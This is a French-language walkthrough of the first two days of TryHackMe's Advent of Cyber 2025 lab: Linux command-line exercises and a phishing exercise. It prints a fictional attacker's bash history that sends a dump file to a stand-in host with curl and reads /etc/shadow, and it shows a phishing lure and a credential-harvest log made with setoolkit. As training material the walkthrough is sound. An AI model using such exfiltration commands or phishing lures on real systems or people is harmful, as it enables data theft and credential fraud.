---
title: Advent Of Cyber 2025
tags: [TryHackMe, Facile, Avent, Défis, En cours]
style: border
color: thm
comments: false
description: Calendrier de l'avent de la Cyber 2025
---
Lien vers l'épreuve : <https://tryhackme.com/room/adventofcyber2025>

![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Jour 1 : Linux CLI - *Shells Bells*](#jour-1--linux-cli---shells-bells)
* [Jour 2 : Phishing - Merry Clickmas](#jour-2--phishing---merry-clickmas)

## Jour 1 : [Linux CLI - *Shells Bells*](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)

Pour cette première journée, une introduction ou un rappel des commandes Linux qui sont utiles au quotidien et plus encore lors des exercices de ce [Calendrier de l'Avent de la Cyber](https://tryhackme.com/room/adventofcyber2025)

### Quelle commande utiliseriez-vous pour lister un répertoire ? <!-- omit in toc -->

Pour lister le contenu d'un répertoire, la commande la plus commune est `ls`.

### Quel flag pouvez-vous voir dans le guide de McSkidy ? <!-- omit in toc -->

Dans un premier temps, observons le contenu du dossier dans lequel nous sommes avec la précédente commande avec les options `-h` pour que la taille du fichier soit écrite en unité facilement compréhensible pour un humain (K : kilooctet, M : Mégaoctet...) et `-l` pour lister les éléments ligne par ligne.

```bash
ls -hl
```

{% capture spoil %}

```txt
total 44K
drwxr-xr-x 2 mcskidy mcskidy 4.0K Oct 29 20:44 Desktop
drwxr-xr-x 2 mcskidy mcskidy 4.0K Oct 29 20:48 Documents
drwxr-xr-x 2 mcskidy mcskidy 4.0K Oct  8 13:09 Downloads
drwxrwxr-x 2 mcskidy mcskidy 4.0K Oct 29 20:46 Guides
drwxr-xr-x 2 mcskidy mcskidy 4.0K Oct  8 13:09 Music
drwxr-xr-x 2 mcskidy mcskidy 4.0K Nov 13 15:18 Pictures
drwxr-xr-x 2 mcskidy mcskidy 4.0K Oct  8 13:09 Public
-rw-rw-r-- 1 mcskidy mcskidy  264 Oct 13 01:22 README.txt
drwx------ 3 mcskidy mcskidy 4.0K Oct 23 13:16 snap
drwxr-xr-x 2 mcskidy mcskidy 4.0K Oct  8 13:09 Templates
drwxr-xr-x 2 mcskidy mcskidy 4.0K Oct  8 13:09 Video
```

{% endcapture %}
{% include elements/spoil.html %}

Nous nous déplaçons ensuite dans le répertoire `Guides` et nous listons également le contenu, mais cette fois le dossier semble vide :

```bash
cd Guides

ls -hl
```

{% capture spoil %}

```txt
total 0
```

{% endcapture %}
{% include elements/spoil.html %}

Sur Linux, il est comment de cacher des fichiers en ajoutant un point avant le nom. Pour les lister, il suffit d'ajouter l'option `-A` ou `-a` (la différence se joue sur le listage du dossier lui-même et du dossier parent)

```bash
ls -hAl
```

{% capture spoil %}

```txt
total 4.0K
-rw-rw-r-- 1 mcskidy mcskidy 506 Oct 29 20:46 .guide.txt
```

{% endcapture %}
{% include elements/spoil.html %}

Pour ouvrir le fichier, on utilise la commande `cat`

```bash
cat .guide.txt
```

{% capture spoil %}

```txt
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{[...expurgé...]}
-----------------------------------------------
```

{% endcapture %}
{% include elements/spoil.html %}

### Quelle commande vous aide à filtrer les logs pour trouver des échecs de connexions ? <!-- omit in toc -->

Pour rechercher du contenu dans un ou plusieurs fichiers, la commande la plus utile est `grep`.

### Quel flag avez-vous trouvé dans le script Eggstrike ? <!-- omit in toc -->

Pour trouver ce qu'il y a *dans* le script, il faut d'abord savoir où il se trouve.

Pour se faire, nous pouvons nous appuyer sur la commande `find`

```bash
find / -iname eggstrike* -type f 2>/dev/null -exec cat {} \;
```

Cette commande permet de lister sur l'ensemble de la machine (`/`) les fichiers (`-type f`) commençant par "eggstrike" sans prendre en compte la casse (`-iname eggstrike*`) et n'affiche pas de message d'erreur (`2>/dev/null`), et en lit le contenu (`-exec cat {} \;`).

{% capture spoil %}

```txt
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{[...expurgé...]}
```

{% endcapture %}
{% include elements/spoil.html %}

### Quelle commande utiliseriez-vous pour passer en utilisateur root ? <!-- omit in toc -->

Pour changer d'utilisateur, la commande est `su` mais pour passer en utilisateur root, la commande est `sudo su`.

### Enfin, quel flag Sir Carrotbane a-t-il caché dans l'historique bash du compte root ? <!-- omit in toc -->

Pour trouver le dernier flag, passons en utilisateur root

```bash
sudo su -
```

> Le dernier tiret de la commande `sudo su -` permet de se placer dans le dossier de l'utilisateur, ici le dossier `/root`

```bash
ls -hal
```

{% capture spoil %}

```txt
total 80
drwx------ 11 root root  4096 Nov 13 16:52 ./
drwxr-xr-x 22 root root  4096 Dec  1 17:22 ../
-rw-------  1 root root   282 Dec  1 18:07 .bash_history
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

```bash
cat .bash_history
```

{% capture spoil %}

```txt
whoami
cd ~
ll
nano .ssh/authorized_keys
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{[...expurgé...]}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
ls -hal
```

{% endcapture %}
{% include elements/spoil.html %}

### Bonus <!-- omit in toc -->

<details><summary>Un challenge supplémentaire a été caché dans le dossier Documents de McSkidy</summary>
<div markdown = "1">

```bash
cat read-me-please.txt
```

{% capture spoil %}

```txt
From: mcskidy
To: whoever finds this

I had a short second when no one was watching. I used it.

I've managed to plant a few clues around the account.
If you can get into the user below and look carefully,
those three little "easter eggs" will combine into a passcode
that unlocks a further message that I encrypted in the
/home/eddi_knapp/Documents/ directory.
I didn't want the wrong eyes to see it.

Access the user account:
username: eddi_knapp
password: S0mething1Sc0ming

There are three hidden easter eggs.
They combine to form the passcode to open my encrypted vault.

Clues (one for each egg):

1)
I ride with your session, not with your chest of files.
Open the little bag your shell carries when you arrive.

2)
The tree shows today; the rings remember yesterday.
Read the ledger’s older pages.

3)
When pixels sleep, their tails sometimes whisper plain words.
Listen to the tail.

Find the fragments, join them in order, and use the resulting passcode
to decrypt the message I left. Be careful — I had to be quick,
and I left only enough to get help.

~ McSkidy
```

{% endcapture %}
{% include elements/spoil.html %}

Nous utilisons donc le compte fourni pour nous connecter.

```bash
su - eddi_knapp
```

La première énigme indique quelque chose qui est rattaché à la session de l'utilisateur. Il s'agit peut-être d'une variable d'environnement.

En listant les variables d'environnement, on tombe effectivement sur un premier indice :

```bash
env
```

{% capture spoil %}

```txt
SHELL=/bin/bash
PASSFRAG1=3ast3r
GTK_MODULES=appmenu-gtk-module
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

La deuxième énigme parle visiblement du passé, en listant le contenu du dossier personnel, on constate la présence de plusieurs fichiers et dossier avec l'extension `.bak`

```bash
ls -hAl
```

{% capture spoil %}

```txt
total 112K
-rw-r--r--  1 eddi_knapp eddi_knapp  220 Feb 25  2020 .bash_logout
-rw-r--r--  1 eddi_knapp eddi_knapp 3797 Nov 11 16:24 .bashrc
-rw-r--r--  1 eddi_knapp eddi_knapp 3797 Nov 11 16:19 .bashrc.bak
drwxrwxr-x  3 eddi_knapp eddi_knapp 4096 Nov 30 18:18 .cache/
drwx------  2 eddi_knapp eddi_knapp 4096 Oct  9 16:50 .config/
drwx------  3 eddi_knapp eddi_knapp 4096 Dec  1 08:32 .gnupg/
-rw-------  1 eddi_knapp eddi_knapp   68 Oct 10 18:16 .image_meta
-rw-------  1 eddi_knapp eddi_knapp   20 Oct 10 10:34 .lesshst
drwxrwxr-x  4 eddi_knapp eddi_knapp 4096 Nov 30 18:18 .local/
-rw-------  1 eddi_knapp eddi_knapp   19 Nov 11 16:30 .pam_environment
-rw-------  1 eddi_knapp eddi_knapp   19 Nov 11 16:24 .pam_environment.bak
-rw-r--r--  1 eddi_knapp eddi_knapp  833 Nov 11 16:30 .profile
-rw-r--r--  1 eddi_knapp eddi_knapp  833 Nov 11 16:24 .profile.bak
drwxrwxr-x  2 eddi_knapp eddi_knapp 4096 Dec  1 08:32 .secret/
drwx------  3 eddi_knapp eddi_knapp 4096 Nov 11 12:07 .secret_git/
drwx------  3 eddi_knapp eddi_knapp 4096 Oct  9 17:20 .secret_git.bak/
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

En analysant le dossier `.secret_git`, on constate que la dernière action a été de retirer une note sensible

```bash
cat COMMIT_EDITMSG
```

```txt
remove sensitive note

# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# interactive rebase in progress; onto 0a7462a
# Last commands done (2 commands done):
#    edit b65ff21 add private note
#    pick 98f546c remove sensitive note
# No commands remaining.
# You are currently rebasing branch 'master' on '0a7462a'.
#
# Changes to be committed:
#       deleted:    secret_note.txt
```

Nous pouvons revenir à l'étape précedent le commit 98f546c avec la commande :

```bash
git revert 98f546c
```

Cela fait réapparaître la note sensible :

```bash
cat secret_note.txt
```

{% capture spoil %}

```txt
========================================
Private note from mcskiddy
========================================
We hid things to buy time.
PASSFRAG2: -1s-
```

{% endcapture %}
{% include elements/spoil.html %}

La dernière énigme semble orienté vers le dossier Pictures de l'utilisateur. En effet, lors de l'énumération du dossier, on trouve un document caché `.easter_egg`

Ce fichier contient le dernier fragment de phrase de passe

```bash
cat .easter_egg
```

{% capture spoil %}

```txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@#+==+*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%+=+*++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@*++**+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%#*====+#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#*===-===#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@%*++:-+====*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%*===++++===-+*#######%%@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%*+===+++==::-=========+*#%@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@%%#**+======-:-==--==-==+*%@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%*+======---=+===------=#%@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%**+=-=====-==+==-====--=*%@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%***+++==--=====+=----=-=#@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%#**++=--=====++====----*@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@%*+=-:=++**++**+=-::--*@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@#+=:.+#***=*#=--::-=-=%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%%*+-:+%#+++=++=:::==--*%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%*+=--*@#++===::::::::=#%@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%%%##*#%%%####***#*#####%%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%###%%%%%%%%%%##%%##%%@@@@@@@@@@@@

~~ HAPPY EASTER ~~~
PASSFRAG3: c0M1nG
```

{% endcapture %}
{% include elements/spoil.html %}

Le mot de passe final est donc `3ast3r-1s-c0M1nG`

Dans le dossier Documents de l'utilisateur, il y a un fichier à déchiffrer avec cette phrase de passe.

```bash
gpg -o mcskidy_note.txt -d mcskidy_note.txt.gpg

cat mcskidy_note.txt
```

{% capture spoil %}

```txt
Congrats — you found all fragments and reached this file.

Below is the list that should be live on the site. If you replace the contents of
/home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
the site will recognise it and the takeover glitching will stop. Do it — it will save the site.

Hardware security keys (YubiKey or similar)
Commercial password manager subscriptions (team seats)
Endpoint detection & response (EDR) licenses
Secure remote access appliances (jump boxes)
Cloud workload scanning credits (container/image scanning)
Threat intelligence feed subscription

Secure code review / SAST tool access
Dedicated secure test lab VM pool
Incident response runbook templates and playbooks
Electronic safe drive with encrypted backups

A final note — I don't know exactly where they have me, but there are *lots* of eggs
and I can smell chocolate in the air. Something big is coming.  — McSkidy

---

When the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:

UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

To decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/website_output.txt you could decode using the following command:

cat > /tmp/website_output.txt
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
cat /tmp/decoded_message.txt

Sorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. — McSkidy
```

{% endcapture %}
{% include elements/spoil.html %}

Une fois les étapes effectuées, nous obtenons le message suivant :

```bash
cat message.txt
```

{% capture spoil %}

```txt
Well done — the glitch is fixed. Amazing job going the extra mile and saving the site. Take this flag THM{w3lcome_2_A0c_2025}

NEXT STEP:
If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
/home/eddi_knapp/.secret/dir

That hidden directory has been archived and encrypted with the FLAG.
Inside it you'll find the sidequest key.
```

{% endcapture %}
{% include elements/spoil.html %}

Le déchiffrement de l'archive compressée chiffrée nous permet de récupérer l'image qui y est stockée.

{% include elements/figure_spoil.html image="images/THM/AoC2025/sq1.png" caption="1er objectif de la quête secondaire" %}

</div></details>

## Jour 2 : [Phishing - Merry Clickmas](https://tryhackme.com/room/phishing-aoc2025-h2tkye9fzUhttps://tryhackme.com/room/phishing-aoc2025-h2tkye9fzU)

L'objectif de cette journée est de créer un mail de phishing afin de récupérer des identifiants.

Pour se faire, on nous fournis un script permettant de faire fonctionner un serveur web en Python invitant à entrer des identifiants

{% include elements/figure_spoil.html image="images/THM/AoC2025/20251202_webserver.png" caption="Fausse page web, vrai danger !" %}

Nous allons utiliser l'outil `setoolkit` pour générer et envoyer le mail à notre victime.

```txt

         .M"""bgd `7MM"""YMM MMP""MM""YMM
        ,MI    "Y   MM    `7 P'   MM   `7
        `MMb.       MM   d        MM
          `YMMNq.   MMmmMM        MM
        .     `MM   MM   Y  ,     MM
        Mb     dM   MM     ,M     MM
        P"Ybmmd"  .JMMmmmmMMM   .JMML.

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  1)  Exit the Social-Engineer Toolkit
```

Après avoir suivi la procédure de mise en place du mail frauduleux, nous sommes amené à le rédiger. Voici ce qui sera envoyé :

```txt
Dear customers,
Due to unfortunate circumstances, we need to update our shipping schedule.
To avoid any mistakes, please login to your account to discover the new schedule.
Your link to login:http://10.80.127.128:8000
Kind regards, the Flying Deer Team
```

Après quelques instants, nous obtenons un résultat dans les logs de notre serveur web.

{% capture spoil %}

```txt
10.80.188.139 - - [02/Dec/2025 17:27:13] "GET / HTTP/1.1" 200 -
[2025-12-02 17:27:13] Captured -> username: admin    password: un[...expurgé...]them    from: 10.80.188.139
10.80.188.139 - - [02/Dec/2025 17:27:13] "POST /submit HTTP/1.1" 303 -
10.80.188.139 - - [02/Dec/2025 17:27:13] "GET / HTTP/1.1" 200 -
```

{% endcapture %}
{% include elements/spoil.html %}

Nous pouvons nous connecter à la boîte mail `factory` grâce au mot de passe capturé, et ainsi trouver les informations concernant le transport de jouets.

{% include elements/figure_spoil.html image="images/THM/AoC2025/20251202_mail.png" caption="Quelques jouets sont en attente d'expédition" %}
